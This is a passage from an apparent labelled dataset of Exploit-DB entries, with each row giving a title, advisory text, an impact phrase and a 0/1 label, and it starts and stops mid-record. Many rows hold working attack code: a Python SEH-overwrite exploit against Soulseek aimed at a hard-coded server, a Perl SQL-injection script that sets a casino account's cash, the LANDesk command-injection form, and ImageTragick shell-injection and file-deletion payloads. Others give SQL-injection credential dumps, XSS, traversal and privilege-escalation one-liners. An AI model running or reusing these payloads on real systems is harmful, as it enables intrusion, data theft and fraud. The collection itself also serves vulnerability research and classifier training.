""\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00"".  ""\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01"".  ""\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22"".  ""\x71\x14\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24"".  ""\x33\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29"".  ""\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A"".  ""\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A"".  ""\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87\x88\x89\x8A"".  ""\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8"".  ""\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6"".  ""\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3"".  ""\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9"".  ""\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01"".  ""\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09"".  ""\x0A\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07"".  ""\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31"".  ""\x06\x12\x41\x51\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1"".  ""\xB1\xC1\x09\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1"".  ""\x25\xF1\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39"".  ""\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59"".  ""\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79"".  ""\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97"".  ""\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5"".  ""\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3"".  ""\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA"".  ""\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x0C\x03\x01\x00"".  ""\x02\x11\x03\x11\x00\x3F\x00\xF7\xFA\x28\xA2\x80\x0A\x28\xA2\x80"".  ""\x0A\x28\xA2\x80\x0A\x28\xA2\x80\x3F\xFF\xD9"";  open(file , "">"", ""Kedans.jpg""); # Evil Image JPG   print file $PoC;    print ""\n [+] File successfully created!\n"" or die print ""\n [-] OpsS! File is Not Created !! ""; close(file);    #================[ Exploited By KedAns-Dz * HST-Dz * ]========================= # GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One # XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ; # > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers < # My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others # 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ... # sec4ever.com members Dz : =>> #  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others # hotturks.org : TeX * KadaVra ... all Others # Kelvin.Xgr ( kelvinx.net) #===========================================================================",denial of service,1
26933,ProjectApp 3.3 - 'links.asp?keywords' Cross-Site Scripting source: https://www.securityfocus.com/bid/16011/info     ProjectApp is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.     An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/links.asp?keywords=[XSS],have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
15488,"Landesk - OS command Injection 1. Advisory Information Title: Landesk OS command injection Advisory Id: CORE-2010-1018 Advisory URL: http://www.coresecurity.com/content/landesk-os-command-injection-vulnerability Date published: 2010-11-10 Date of last update: 2010-11-10 Vendors contacted: LANDesk Release mode: Coordinated release  2. Vulnerability Information Class: OS command injection [CWE-78] Impact: Code execution Remotely Exploitable: Yes (client-side) Locally Exploitable: No CVE Name: CVE-2010-2892 Bugtraq ID: N/A  3. Vulnerability Description The LANDesk division of Avocent Corporation [1] provides systems management, security management, service desk, asset management, and process management solutions to organizations. The company's software is used worldwide.  A security vulnerability was discovered in LANDesk Management Suite: The Landesk web application does not sufficiently verify if a well-formed request was provided by the user who submitted the request. Using this information an external remote attacker can run arbitrary code using the gsbadmin user (that is the user running the web-server).  In order to be able to successfully make the attack, the administrator must be logged in to the appliance with the browser that the attacker uses to make the attack (for instance, exploiting a XSS in a different tab in the browser).  4. Vulnerable Packages LANDesk Management Gateway 4.0 GSBWEB v1.61s LANDesk Management Gateway 4.2 GSBWEB v1.61 Older versions are probably affected too  5. Non-Vulnerable Packages LANDesk Management Gateway 4.0 GSBWEB v1.62 LANDesk Management Gateway 4.2 GSBWEB v1.62  6. Vendor Information, Solutions And Workarounds Workaround for non-patched versions:  Launch a SSH console session, or log onto the LDMG console and start a terminal session. Issue the following command: mv /usr/LANDesk/broker/webroot/gsb/drivers.php ~ For additional information about this issue, check the LANDesk public announcement http://community.landesk.com/support/docs/DOC-21767.  7. Credits This vulnerability was discovered and researched by Aureliano Calvo from Core Security Technologies.  8. Technical Description / Proof Of Concept Code The Landesk web application does not sufficiently verify if a well-formed request was provided by the user who submitted the request.  Using this information an external remote attacker can run arbitrary code using the gsbadmin user (that is the user running the web-server), but the gsbadmin user has sudo privileges. Looking at /etc/sudoers, you can see that the attacker can also take down the firewall (injecting: ; sudo /subin/firewall stop into DRIVES) and load arbitrary kernel modules (injecting ; sudo /subin/modprobe /tmp/a_module), effectively taking complete control of the server.  In order to be able to successfully make the attack, the administrator must be logged in to the  ppliance with the browser that the attacker uses to make the attack (for instance, exploiting a XSS in a different tab in the browser).  8.1. PROOF OF CONCEPT  This PoC is an HTML form (that can be hosted on any web site) that makes a request to the [server]. The parameter DRIVES contains the actual injection. In the example, we generate the file /tmp/ATTACKED to show that arbitrary shell commands can be executed in the server.  <head><title>LANDesk PoC</title></head>   <body>     <form method=""post"" action=""https://[server]/gsb/drivers.php"">       <input type=""text"" name=""DRIVES"" value=""; touch /tmp/ATTACKED"">       <input type=""text"" name=""SECONDTIME"" value=""1"">       <input type=""text"" name=""ACTION"" value=""getupdate"">       <input type=""submit"" value=""Attack!"">     </form>   </body> </html>   9. Report Timeline 2010-10-18: Core Security Technologies notifies the LANDesk team of the vulnerability, setting the estimated publication date of the advisory to November 9th 2010. 2010-10-19: The LANDesk team acknowledges Core Security Technologies' e-mail and asks for a technical description of the vulnerability. 2010-10-19: Core sends an advisory draft. 2010-10-21: The LANDesk team notifies they are reviewing the issue and will contact Core in few days. 2010-10-22: The LANDesk team notifies they have verified the vulnerability and have identified the cause. LANDesk is working on a possible fix and will send an update once the testing of this fix is completed. 2010-11-02: Core acknowledges LANDesk's e-mail. 2010-11-08: LANDesk team notifies that they are testing a patch, and they will probably ready to release a fixed version tomorrow, Tuesday 9th. 2010-11-08: Core acknowledges LANDesk's e-mail and asks the version numbers of both patched and vulnerable versions. 2010-11-08: LANDesk team notifies the version numbers of the affected and patched versions, and also sends the workaround mentioned in the [Sec. 6]. 2010-11-08: LANDesk team requests to postpone the advisory publication for 24hs given that they are unable to be ready by that time. 2010-11-09: Core re-schedules the advisory publication to November 10th. 2010-11-10: The advisory CORE-2010-1018 is published.  10. References [1] LANDesk website http://www.landesk.com/.   11. About CoreLabs CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.  12. About Core Security Technologies Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies  augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.  13. Disclaimer The contents of this advisory are copyright (c) 2010 Core Security Technologies and (c) 2010 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/",run arbitrary code,1
32284,"Simasy CMS - 'id' SQL Injection source: https://www.securityfocus.com/bid/30774/info  Simasy CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com.com/index.php?page=8&id=95+AND+1=0+UNION+SELECT+ALL+1,group_concat(username,0x3a,email,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,2 3+from+users/*","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
11247,Opera 10.10 - XML Parser Denial of Service (PoC) # From tiny islands of maldivies # d3b4g.info # Tested: version 10.10 # Tested on windows XP SP3 # 20-01-2010 # special thanks to peter Van Eeckhoutte  after opening the opera.html broswer hang for a while and crush.same bug in firefox too :d  This vulnerability  cause a denial of service (memory corruption) via an XML document composed of a long series of start-tags with no corresponding end-tags.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/11247.rar (Opera_10.10-PoC.rar),denial of service,1
33981,GameCore 2.5 - 'GameID' Integer Overflow source: https://www.securityfocus.com/bid/40155/info  GameCore is prone to a remote integer-overflow vulnerability.  An attacker can exploit this issue to cause a denial-of-service condition.  GameCore 2.5 is vulnerable; other versions may be affected.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33981.dat,cause a denial-of-service condition,1
8777,"Soulseek 157 NS x/156.x - Remote Distributed Search Code Execution ============================================= - Release date: May 24th, 2009 - Discovered by: Laurent GaffiÃ© - Severity: critical =============================================  I. VULNERABILITY ------------------------- Soulseek 157 NS * & 156.* Remote Distributed Search Code Execution  II. BACKGROUND ------------------------- ""Soulseek(tm) is a unique ad-free, spyware free, and just plain free file  sharing application. One of the things that makes Soulseek(tm) unique is our community and  community-related features. Based on peer-to-peer technology, virtual rooms allow you to meet people with the same interests, share information, and chat freely using real-time messages in public or private. Soulseek(tm), with its built-in people matching system, is a great way to make  new friends and expand your mind!""  III. DESCRIPTION ------------------------- Soulseek client allows distributed file search to one person, everyone, or in a  specific Soulseek IRC channel, allowing a user to find the files he wants, in  a dedicated channel, or with his contacts, or on the whole network. Unfortunatly this feature is vulnerable to a remote SEH overwrite to a specific user, or even to a whole Soulseek IRC channel.  IV. PROOF OF CONCEPT ------------------------- This proof of concept is made to prevent a S-K party, it is only build to  target the user ""testt4321"".  To try this proof of concept, you would have to open a soulseek client and use the username: ""testt4321"" with the password: ""12345678"" And launch this code. If you want to change the username or target a whole channel, you would have  to reverse the protocol :)    #!/usr/bin/python import struct import sys, socket  from time import *  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""208.76.170.50"",2242))  # Change to Port 2240 for 156* branch  buffer = ""\x48\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x74\x65\x73\x74"" buffer+= ""\x34\x33\x32\x31\x08\x00\x00\x00\x31\x32\x33\x34\x35\x36\x37\x38"" buffer+= ""\xb5\x00\x00\x00\x20\x00\x00\x00\x38\x65\x39\x31\x66\x37\x33\x30"" buffer+= ""\x35\x35\x37\x31\x32\x35\x64\x37\x34\x39\x32\x34\x62\x64\x66\x35"" buffer+= ""\x63\x32\x39\x61\x36\x37\x64\x61\x01\x00\x00\x00""  s.send(buffer) sleep(1)   junk = ""\x41"" * 3084 next_seh = struct.pack('<L', 0x42424242) seh =      struct.pack('<L', 0x43434343) other_junk = ""\x61"" * 1423  buffer2 = ""\x01\x0f\x00\x00\x2a\x00\x00\x00\x09\x00\x00\x00\x74\x65\x73\x74"" buffer2+= ""\x74\x34\x33\x32\x31\xa4\x5a\x51\x44\xe8\x0e\x00\x00""+junk+next_seh+seh+other_junk s.send(buffer2) sleep(1) s.recv(1024)    After the query is send, the memory will look like this 0012FBE4   41414141 0012FBE8   42424242  Pointer to next SEH record 0012FBEC   43434343  SE handler 0012FBF0   61616161  And the program will terminate with this structure: EAX 00000000 ECX 43434343 EDX 7C9132BC ntdll.7C9132BC EBX 00000000 ESP 0012EA78 EBP 0012EA98 ESI 00000000 EDI 00000000 EIP 43434343   V. BUSINESS IMPACT ------------------------- An attacker could exploit this vulnerability to compromise any Soulseek client connected to the Soulseek network.  VI. SYSTEMS AFFECTED ------------------------- Windows all versions  VII. SOLUTION ------------------------- A fast solution would be to use Nicotine-Plus (http://nicotine-plus.sourceforge.net/)  a Python Soulseek client. Another quick workaround at server level would be to limit the search query lenght.  VIII. REFERENCES ------------------------- http://www.slsknet.org  IX. CREDITS ------------------------- This vulnerability has been discovered by Laurent GaffiÃ© Laurent.gaffie{remove-this}(at)gmail.com   X. REVISION HISTORY ------------------------- May 24, 2009: Initial release   XI. DISCLOSURE TIMELINE ------------------------- july      29, 2008: Bug discovered September 03, 2008: Vendor contacted; no response. October   14, 2008: Vendor contacted; still no response. April     12, 2009: Idefense contacted. April     13, 2009: Idefense answered. April     23, 2009: Advisory send to idefense contributor program. May       13, 2009: Idefense contacted, bug rejected (no reason given) May       15, 2009: Idefense recontacted; no answer. May       16, 2009: Last try to contact Soulseek maintainers May       24, 2009: Advisory published.  XII. LEGAL NOTICES ------------------------- The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. I accept no responsibility for any damage caused by the use or  misuse of this information.  # milw0rm.com [2009-05-26]",Search Code Execution,1
30386,Vikingboard 0.1.2 - 'topic.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/25056/info     Vikingboard is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.     Exploiting this issue could allow an attacker to steal cookie-based authentication credentials and to launch other attacks.     Vikingboard 0.1.2 is vulnerable; other versions may also be affected.   http://www.example.com/viking/topic.php?t=2&s=0[XSS-CODE],fails to sufficiently sanitize user-supplied data,0
34210,"OneCMS 2.6.1 - 'cat' Cross-Site Scripting source: https://www.securityfocus.com/bid/41194/info  OneCMS is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  OneCMS 2.6.1 is vulnerable; prior versions may also be affected.  http://www.example.com/admin/admin.php?cat=cheats%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",fails to sanitize user-supplied input,0
28833,"Casinosoft Casino Script 3.2 - 'config.php' SQL Injection source: https://www.securityfocus.com/bid/20646/info  Casinosoft Casino Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  Version 3.2 is vulnerable; other versions may also be affected.  #!/usr/bin/perl  ## Massvet ........ ...... - ......... .......... .......! ## ........ ...... 3.2, ........ ..... ......, . .......... magicquotes ## ......... .. ...... 3.2 ## ## writed bu G1UK ## CFTeam  use LWP::UserAgent; use Getopt::Std; use HTTP::Cookies;  getopts(""h:d:l:p:c:x:"");  $host = $opt_h; $dir = $opt_d || '/'; $login = $opt_l; $pass = $opt_p; $cash = $opt_c; $proxy = $opt_x || ''; logo();   if(!$host||!$login||!$pass||!$cash) { help(); }  print ""=) server : $host \r\n""; print ""=) casino dir : $dir \r\n""; print ""=) login : $login \r\n""; print ""=) password : $pass \r\n""; print ""=) cash : $cash \r\n""; print ""\r\n"";  $cook = LWP::UserAgent->new() or die; $cookie = HTTP::Cookies->new(); $cook->cookie_jar( $cookie ); $url=$host.''.$dir; $cook->proxy('http'=>'http://'.$proxy) if $proxy;  printf ""Registering =)\r\n""; $res = $cook->post('http://'.$url.'reg.php', [ ""r_login"" => ""$login"", ""r_pass"" => ""$pass"", ""r_email"" => ""1"", ""send"" => ""1"", ""submit""=> ""........."" ]); print ""Registering OK\r\n"";  print ""Enter =)\r\n""; $res = $cook->post('http://'.$url.'lobby/login_proc.php', [ ""log"" => ""$login"", ""psw"" => ""$pass"", ""send"" => ""1"", ""submit""=> ""....."", ""Cookie"" => ""PHPSESSID="".$sid ]); print ""Enter OK\r\n"";  print ""Edit you cash =))\r\n""; $res = $cook->post('http://'.$url.'lobby/config.php', [ ""cpass"" => ""$pass"", ""cname"" => """", ""cfam"" => ""',cash='"".$cash.""' where login='"".$login.""'/*"", ""send"" => ""1"", ""Cookie"" => ""PHPSESSID="".$sid ]); print ""Check out you cash =)\r\n"";  sub logo() { print  ""<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n""; print ""Massvet internet casino v3.2 sql injection cash exploit by  CFTeam\r\n""; print  ""<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n""; }  sub help() { print ""CFteam.pl -h <host> -d [dir] -l <login> -p <password> -c <cash>  -x [proxy]\r\n\r\n""; print ""<host> - Host where cazino installed for example -  www.massvet.ru\r\n""; print ""[dir] - Directory, where cazino is installed /cazino/ for  example\r\n""; print ""<login> - User name for registrate \r\n""; print ""<password> - Password for registrate \r\n""; print ""<cash> - How much you need? (00.00)\r\n""; print ""[proxy] - For you safety \r\n""; exit(); }","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation",1
22143,"BRS Webweaver 1.0 1 - MKDir Directory Traversal source: https://www.securityfocus.com/bid/6585/info  WebWeaver's FTP component has a flaw which can permit a remote user to create directories outside the FTP root.  By executing the mkdir command on an ftp server with dot-dot-slash (..\) directory traversal notation, an attacker can create a directory outside of the FTP root.   mkdir ..\[directoryname]",create directories outside the FTP root,1
24614,"Mambo Open Source 4.5.1 (1.0.9) - Cross-Site Scripting source: https://www.securityfocus.com/bid/11220/info  Mambo open source is reportedly affected by multiple input validation vulnerabilities. These issues are due to a failure of the application to properly validate user-supplied URI parameters.  An attacker may leverage these issues to execute arbitrary server-side script code on an affected computer, to carry out cross-site scripting attacks, and to make SLQ injection attacks against the vulnerable application.  http://www.example.com/index.php?option=com_content&task=view&id=15&Itemid=2&limit=1"">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&limitstart=1",execute arbitrary server-side script code on an affected computer,1
41951,"HideMyAss Pro VPN Client for OS X 2.2.7.0 - Local Privilege Escalation Source: https://www.securify.nl/advisory/SFY20170402/multiple_local_privilege_escalation_vulnerabilities_in_hidemyass_pro_vpn_client_v2_x_for_os_x.html  Abstract Multiple local privilege escalation vulnerabilities were found in the helper binary HMAHelper that ships with HideMyAss Pro VPN for OS X. The helper is installed setuid root and responsible for loading Kernel Extensions (kext) and managing VPN firewall rules. These issues can be leveraged by a local attacker to gain elevated (root) privileges.   Tested versions: This issue was tested on HMA Pro VPN version 2.2.7.0 for OS X   Fix: HMA Support has reported that this issue will not be fixed. Version 2.2.7.0. is still available for download and was earlier this year also available in the Mac App Store. It seems that this version is still available for older versions of OS X (OS X 10.7 - 10.11).  It should be noted the latest version of HMA Pro VPN for OS X (version 3.3.0.3) is vulnerable to a similar local privilege escalation issue that is also not fixed at the time of writing.   Introduction: HideMyAss is a popular VPN service that allows users to hide their identity and browse anonymously online. HideMyAss also provides applications to setup the VPN connections, including a client for OS X. It was discovered that version 2.x of HMA Pro VPN for OS X is affected by multiple local privilege escalation vulnerabilities.   Details: The helper binary HMAHelper that ships with HMA Pro VPN for OS X is installed as setuid root. The helper has the ability to execute several commands as root, including running kernal extentions (kext) but also enabling and disabling security firewall rules.  Although disabling the firewall is dangerous enough, it was found that the helper is affected by multiple local privilege escalation vulnerabilities. Taking the FirewallDisable rule as an example, the code snippet below shows that there is no limit to which executable can be executed allowing a local user (or malware) to run any executable as root.  Privax.OSX.HMA.Helper.FirewallManager  private static void FirewallDisableSelected(string path, string args, string processNames) {    using (Process process = new Process())    {       ProcessStartInfo startInfo = process.StartInfo;       startInfo.FileName = ""/usr/bin/sudo"";       startInfo.Arguments = string.Format(""\""{0}\"" \""{1}\"" \""{2}\"""", (object) path, (object) args, (object) processNames);       startInfo.CreateNoWindow = true;       startInfo.UseShellExecute = false;       PermissionsManager.PermissionsSet(PermissionsManager.UIDRoot, PermissionsManager.GIDWheel);       process.Start();       process.WaitForExit();    } }   Proof of concept:  /Applications/HMA\!\ Pro\ VPN.app/Contents/Resources/Applications/HMAHelper.app/Contents/MacOS/HMAHelper --sib-firewall-enable 'su' ''",privilege escalation,1
40691,"Microsoft Internet Explorer 11 - MSHTML CView::CalculateImageImmunity Use-After-Free <!-- Source: http://blog.skylined.nl/20161102001.html  Synopsis  Setting the listStyleImage property of an Element object causes Microsoft Internet Explorer 11 to allocate 0x4C bytes for an ""image context"" structure, which contains a reference to the document object as well as a reference to the same CMarkup object as the document. When the element is removed from the document (-fragment), this image context is freed on the next ""draw"". However, the code continues to use the freed context almost immediately after it is freed.  Known affected versions, attack vectors and mitigations  Microsoft Internet Explorer 11 An attacker would need to get a target user to open a specially crafted webpage. As far as can be determined, disabling JavaScript should prevent an attacker from triggering the vulnerable code path. -->  <script>   var oDocumentFragment = document.createDocumentFragment(),       oElement = document.createElement('x');   oDocumentFragment.appendChild(oElement);   oElement.style.listStyleImage = ""url(x)"";   oDocumentFragment.removeChild(oElement); </script>  <!-- Exploit  I tried a few tricks to see if there was an easy way to reallocate the freed memory before the reuse, but was unable to find anything. I do not know if there is a way to cause further reuse of the freed memory later on in the code. Running the repro as-is without page heap does not appear to trigger crashes. It does not appear that there is enough time between the free and reuse to exploit this issue.  Timeline  May 2014: This vulnerability was found through fuzzing. June 2014: This vulnerability was submitted to ZDI. July 2014: ZDI rejects the submission. November 2016: The issue does not reproduce in the latest build of MSIE 11. November 2016: Details of this issue are released.  Unfortunately, my records of what happened after ZDI rejected the issue are patchy. It appears that I did not pursue reporting the issue anywhere else, but Microsoft does appear to have patched the issue, as I can no longer reproduce it. -->",stop,0
37090,Joomla! Component JA T3 Framework - Directory Traversal source: https://www.securityfocus.com/bid/53039/info  The JA T3 Framework component for Joomla! is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input data.  Exploiting the issue may allow an attacker to obtain sensitive information that could aid in further attacks.   http://www.example.com/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1,directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input data,1
33975,"Affiliate Store Builder - 'edit_cms.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/40058/info  Affiliate Store Builder is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  <form action='http://www.example.com/admin/edit_cms.php?page=1' name=""frm"" method='post' > <input name=""title"" type=""hidden"" value=""Home""/> <input name=""type"" type=""hidden"" value=""header""/> <input name=""desc_meta"" type=""hidden"" value=""page+desc"" /> <input name=""desc_key"" type=""hidden"" value='""><script>alert(document.cookie)</script>' /> <input name=""cms_id"" type=""hidden"" value=""1"" /> <input name=""edit_page"" type=""hidden"" value=""Edit+Page"" /> </form> <script> document.frm.submit(); </script>","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
25658,"Yahoo! Messenger 5.x/6.0 - URL Handler Remote Denial of Service source: https://www.securityfocus.com/bid/13626/info  Yahoo! Messenger is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.  A remote user can cause Yahoo! Messenger to disconnect through malicious emails or web pages.  This issue is reported to affect Yahoo! Messenger versions 5.x to 6.0 Windows; other versions on other operating systems may also be affected.   <a href=""YMSGR:%63%68%61%74%3F:::%26%26%26%26"">Click Here</a> <a href=""YMSGR:Chat?:::%26%26%26%26"">Click Here</a>",denial-of-service,1
29409,Magic Photo Storage Website - '/admin/admin_email.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info    Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/admin/admin_email.php?_config[site_path]=http://www.example2.com,fails to sufficiently sanitize user-supplied data,0
39767,"ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We've reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 http://legacy.imagemagick.org/script/changelog.php), but this fix seems to be incomplete. We are still working with developers.  ImageMagick: Multiple vulnerabilities in image decoder  1. CVE-2016-3714 - Insufficient shell characters filtering leads to (potentially remote) code execution  Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.  ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests: ""wget"" -q -O ""%o"" ""https:%M"" where %M is the actual link from the input. It is possible to pass the value like `https://example.com""|ls ""-la` and execute unexpected 'ls -la'. (wget or curl should be installed)  $ convert 'https://example.com""|ls ""-la' out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...   The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to https://hackerone.com/stewie for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default delegates.xml / policy.xml, may be vulnerable to this issue.  exploit.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg""|ls ""-la)' pop graphic-context  exploit.svg -=-=-=-=-=-=-=-=- <?xml version=""1.0"" standalone=""no""?> <!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd""> <svg width=""640px"" height=""480px"" version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink= ""http://www.w3.org/1999/xlink""> <image xlink:href=""https://example.com/image.jpg""|ls ""-la"" x=""0"" y=""0"" height=""640px"" width=""480px""/> </svg>  $ convert exploit.mvg out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...  ImageMagick tries to guess the type of the file by it's content, so exploitation doesn't depend on the file extension. You can rename exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In addition, ImageMagick's tool 'identify' is also vulnerable, so it can't be used as a protection to filter file by it's content and creates additional attack vectors (e.g. via 'less exploit.jpg', because 'identify' is invoked via lesspipe.sh). Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.  All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.  2. CVE-2016-3718 - SSRF It is possible to make HTTP GET or FTP request:  ssrf.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(http://example.com/)' pop graphic-context  $ convert ssrf.mvg out.png # makes http request to example.com  3. CVE-2016-3715 - File deletion It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:  delete_file.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' popgraphic-context  $ touch /tmp/delete.txt $ convert delete_file.mvg out.png # deletes /tmp/delete.txt  4. CVE-2016-3716 - File moving It is possible to move image files to file with any extension in any folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and image.gif should exist in known location - /tmp/ for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):  file_move.mvg -=-=-=-=-=-=-=-=- push graphic-context 